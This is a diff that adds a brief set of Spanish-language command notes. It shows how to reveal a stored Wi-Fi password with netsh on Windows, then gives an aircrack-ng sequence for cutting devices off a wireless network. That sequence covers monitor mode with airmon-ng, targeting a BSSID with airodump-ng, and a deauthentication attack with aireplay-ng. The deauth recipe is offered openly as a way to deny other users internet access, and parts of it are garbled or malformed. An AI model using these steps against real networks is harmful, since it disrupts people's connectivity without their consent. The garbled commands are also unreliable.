@@ -1,0 +1,18 @@
+cls = para limpiar pantalla ==clear
+
+Para ver mi contrasena del wifi 
+utilizamos el comando netsh wlan show profiles
+luego el mismo comando mas el nombre de la red + key=clear
+si el ssid de la red el nombre contiene espacio debe de estar dentro de ""
+
+Para entrar a la red y controlar los dispositivos conectados a ellos, en este caso realizar un pin muerto para que estos no tengan conexion a internet
+iwconfig para ver los datos de la tarjeta de red
+digamos que se llama wlan0, estara en modo mananger y lo debemos de tener en modo monitor
+cuando lo activemos ya no tendremos internet
+sudo airmon-ng start wlan0 = para activar
+iwconfig para confirmar el modo monitor activado
+sudo airodump-ng --band a wlan0
+sudo airodump-ng --band a -c canal de la red en este ejemplo 44 --bssid la bssid de la red en este ejemplo CC:ED:DG:4F:4A:8F wlan0
+Ya dentro de la red veremos los dispositivos conectados a la red
+Para realizar la inactividad de la red para cualquier dispositivo se utilizara el siguiente comando
+aireplay-ng -0 - -a + BSSID -c station wlan0 , esto para realizar un pindeath
